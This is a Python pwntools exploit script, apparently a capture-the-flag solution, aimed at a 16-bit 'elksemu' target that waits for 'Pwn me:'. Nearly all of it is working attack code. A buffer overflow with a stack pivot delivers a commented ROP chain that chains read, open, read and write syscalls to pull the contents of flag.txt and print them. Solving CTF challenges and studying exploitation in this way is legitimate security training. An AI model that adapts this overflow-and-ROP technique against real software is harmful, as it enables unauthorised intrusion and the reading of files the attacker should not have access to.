from pwn import *


#### USE launch.json to edit arguments
#### PROCESS INFORMATION ####

try:
    sh.close()
except:
    pass

#context.terminal = 'tmux'


# Insert process data here
context.clear(arch='amd64')
context.log_level = 'info'
context.terminal = ["tmux", "neww", "-n", "shell"]
filename = 'elksemu'


# Remote host information
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1616)


exe = context.binary = ELF(filename)
libc = exe.libc


#### PROCESS START HELPERS ####

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, api=True)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript, api=True)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


#### GDB SCRIPTING DATA ####
gdbscript = '''
tbreak main
continue
'''.format(**locals())


#### PROGRAM EXECUTION ####

pop_bp_ret = p16(0x724) #pop bp; ret
read_syscall = p16(0x88) # syscall read (the syscall sets arguents with bp+2, bp+4, bp+6 AND sets ax)
set_dx_cx_bx = p16(0x9f) # like read_syscall but bypasses ax setting
pivoting = p16(0x722) # stack pivoting (mov bp, sp; pop bp; ret)
set_ax_dx = p16(0x6f9) #mov 0x6(bp) ax, mov 0x8(bp), mov bp sp, pop bp, ret
ret = p16(0x725) # return 
triple_pop = p16(0x6c6) #pop bp, pop di, pop si
exit = p16(0x8e)
bp_address = 0x2000 # base address of the data area where to write ropchain and files


io = start(["../tests/final"])
#io.sendline(" ")
payload = flat(
    b"A"*40, #random data
    b"B"*2, #fake bp (not useful)
    pop_bp_ret, 
    p16(bp_address), # This is the address of bp to write stuff
    read_syscall, 
    pivoting, 
    p16(0x0), #bx
    p16(bp_address), #cx
    p16(0x500), #dx
)

print(io.recvuntil("Pwn me:\n"))
#print(io.recvrepeat(timeout=2))
io.send(payload)

rop_chain = flat(
    # READ TO PUT FLAG.TXT
    p16(0x0),
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0xa), # bp value calculated considering the distances between elements
    set_ax_dx, 
    p16(0x0), # dummy
    ret, #ret to manage alignment
    triple_pop, #triple pop to move sp and avoid  
    p16(0x3), #dummy value for space reason
    p16(0x3), #ax value (SETS SYSCALL NUMBER - READ) 
    p16(0x0), #dx value (not required. will be reset later)
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x16), # new pop bp value
    set_dx_cx_bx, 
    triple_pop, #triple pop to go to the next call
    p16(0x0), #bx
    p16(bp_address+0x200), #cx - I write flag.txt here
    p16(0x500), #dx

    # # # OPEN SYSCALL
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x2a), # bp value calculated considering the distances between elements (updated +0x20)
    set_ax_dx, #mov 0x6(bp) ax, mov 0x8(bp), mov bp sp, pop bp, ret
    p16(0x0), # dummy
    ret, #ret to manage alignment
    triple_pop, #triple pop to move sp and avoid  
    p16(0x3), #dummy value for space reason
    p16(0x5), #ax value (SETS SYSCALL NUMBER - OPEN) 
    p16(0x0), #dx value (not required. will be reset later)
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x36), # new pop bp value
    set_dx_cx_bx, #directly exploit syscall parameters set to set up parameters and bypass ax 
    triple_pop, #triple pop to go to the next call
    p16(bp_address+0x200), #bx - opening flag.txt
    p16(0x0), #cx - set to zero
    p16(0x0), #dx - set to zero

    # # # READ FROM FLAG.TXT
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x4a), # bp value calculated considering the distances between elements (updated +0x20)
    set_ax_dx, #mov 0x6(bp) ax, mov 0x8(bp), mov bp sp, pop bp, ret
    p16(0x0), # dummy
    ret, #ret to manage alignment
    triple_pop, #triple pop to move sp and avoid  
    p16(0x3), #dummy value for space reason
    p16(0x3), #ax value (SETS SYSCALL NUMBER - READ) 
    p16(0x0), #dx value (not required. will be reset later)
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x56), # new pop bp value
    set_dx_cx_bx, #directly exploit syscall parameters set to set up parameters and bypass ax 
    triple_pop, #triple pop to go to the next call
    p16(0x5), #bx - opening flag.txt
    p16(bp_address+0x300), #cx - sets destination where to read flag
    p16(0x40), #dx - amount of bytes to write

    # # # WRITE FROM FLAG.TXT

    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x6a), # bp value calculated considering the distances between elements (updated +0x20)
    set_ax_dx, #mov 0x6(bp) ax, mov 0x8(bp), mov bp sp, pop bp, ret
    p16(0x0), # dummy
    ret, #ret to manage alignment
    triple_pop, #triple pop to move sp and avoid  
    p16(0x3), #dummy value for space reason
    p16(0x4), #ax value (SETS SYSCALL NUMBER - WRITE) 
    p16(0x0), #dx value (not required. will be reset later)
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x76), # new pop bp value
    set_dx_cx_bx, #directly exploit syscall parameters set to set up parameters and bypass ax 
    triple_pop, #triple pop to go to the next call
    p16(0x1), #bx - write to stdout
    p16(bp_address+0x300), #cx - sets destination where to write flag
    p16(0x34), #dx - amount of bytes to write
    exit #exit to avoid segfaults :-)
)   

io.recvrepeat(timeout=0.2)
io.send(rop_chain)
#io.send(rop_chain)
io.recvrepeat(timeout=0.2)
io.send("./flag.txt\x00")

print(io.recvrepeat(timeout=0.2))
io.interactive()